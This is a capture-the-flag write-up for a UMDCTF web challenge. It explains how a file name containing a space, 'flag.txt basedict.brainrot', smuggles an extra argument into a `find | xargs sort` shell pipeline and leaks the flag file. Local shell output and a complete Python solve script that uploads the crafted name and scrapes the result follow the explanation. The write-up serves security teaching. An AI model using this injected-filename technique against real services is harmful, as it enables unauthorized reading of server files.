#Command Injection via file naming

- Each new session creates an upload dir, with a random name (User isolation).
- Flag and a “Base Dict” files are copied to the user upload dir.
- /dict route processes the file using the find linux command.
- The file upload has some basic protections: file extension and a basic protection from path traversal.

- When displaying the dictionary at the /dict route, the application executes a shell command to find, sort, and display the contents of all .brainrot files in the user’s directory: `find {session['upload_dir']} -name \*.brainrot | xargs sort | uniq`.

- even tho it has basic defense against path traversal, it didnot prevent the spaces between filename.

- When the find command runs, the output includes the names of all matching files, including the specially named uploaded file. Because the output is piped directly into xargs, the file name containing a space is interpreted as two separate arguments: flag.txt and basedict.brainrot.
- xargs takes the list of file paths received from find (via standard input) and converts those paths into arguments for the subsequent command (sort). This achieved the challenge's intended goal of merging the contents of all dictionary files, sorting them, and using uniq to remove duplicates.
- By default, xargs splits the input it receives using whitespace (spaces, newlines, tabs) to define separate arguments for the next command.
- The attacker uploaded a file named `flag.txt basedict.brainrot`.

```
echo 'x: y' > 'flag.txt basedict.brainrot'

ls
basedict.brainrot   flag.txt  'flag.txt basedict.brainrot'   somedict.brainrot

cd ../..

find uploads/tRtejqpCqGknnSNtSpIFhkjweaCGnW -name \*.brainrot
uploads/tRtejqpCqGknnSNtSpIFhkjweaCGnW/flag.txt basedict.brainrot
uploads/tRtejqpCqGknnSNtSpIFhkjweaCGnW/somedict.brainrot
uploads/tRtejqpCqGknnSNtSpIFhkjweaCGnW/basedict.brainrot

$ find uploads/tRtejqpCqGknnSNtSpIFhkjweaCGnW -name \*.brainrot | xargs sort | uniq | grep 'UMDCTF'
UMDCTF{local}
```

solve script:
```py
import requests
import io
import re

# --- Config ---
# BASE_URL = "http://127.0.0.1:5000"
BASE_URL = "https://brainrot-dictionary.challs.umdctf.io"
UPLOAD_FILENAME = "flag.txt basedict.brainrot"
FILE_CONTENT = b"y"

# Session
session = requests.Session()

files_data = {
    'user_file': (UPLOAD_FILENAME, io.BytesIO(FILE_CONTENT), 'text/plain')
}

print(f"[*] Uploading '{UPLOAD_FILENAME}' to {BASE_URL}/")

try:
    post_response = session.post(f"{BASE_URL}/", files=files_data, allow_redirects=False)
    if post_response.status_code == 302 and post_response.headers.get('Location', '').endswith('/dict'):

        get_response = session.get(f"{BASE_URL}/dict")
        get_response.raise_for_status()

        content_lines = []
        try:
             matches = re.findall(r'<li.*?>(.*?)</li>', get_response.text, re.IGNORECASE | re.DOTALL)
             content_lines = [match.strip() for match in matches]

        except Exception as e:
            print(f"[!] Error: {e}")
            print(get_response.text)

        found_flags = []
        if not content_lines:
             print("Nothing extracted")
             print(get_response.text)
        else:
            for line in content_lines:
                print(line)
                if line.strip().startswith("UMDCTF"):
                    found_flags.append(line.strip())

        if found_flags:
            print("\n[***] Flags:")
            for flag in found_flags:
                print(f"      -> {flag}")
        else:
            print("\n[-] No flag found")

    elif post_response.status_code == 200:
         print("[!] Upload failed?:")
         error_match = re.search(r'<div.*?class=[\'"]error[\'"].*?>(.*?)</div>', post_response.text, re.IGNORECASE | re.DOTALL)
         if error_match:
             print(f"[!] Error: {error_match.group(1).strip()}")
         else:
             print(post_response.text)
    else:
        print(post_response.text)


except requests.exceptions.RequestException as e:
    print(f"[!] Error: {e}")
except Exception as e:
    print(f"[!] Error: {e}")

```

